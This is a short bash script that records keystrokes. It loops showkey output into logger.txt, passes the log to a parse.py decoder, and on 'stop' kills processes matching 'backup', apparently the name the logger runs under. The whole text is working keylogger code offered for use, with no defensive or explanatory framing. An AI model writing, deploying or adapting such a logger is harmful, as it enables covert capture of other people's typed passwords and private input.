#!/bin/bash

 #-------------------------------------#
#                   		 	#
#    DEVELOPED BY : NISAL PRIYANKA 	#
#					#
 #-------------------------------------#

if [[ $1 == 'stop' ]]; 
then
	#run the parser script [TO key DECODE]
	python parse.py
	kill $(ps aux | awk '/[b]ackup/ {print $2}') 
	exit #exit the script itself

fi

if [[ $1 == 'start' ]];
then

 echo " #-------------------------------------#"
 echo "#                   		 	#"
 echo "#    DEVELOPED BY : NISAL PRIYANKA 	#"
 echo "#					#"
 echo  " #------------------------------------#"
	echo "Keystrokes Record In Progress.."
fi

while true
do
	showkey > logger.txt
	python parse.py
done

	
   
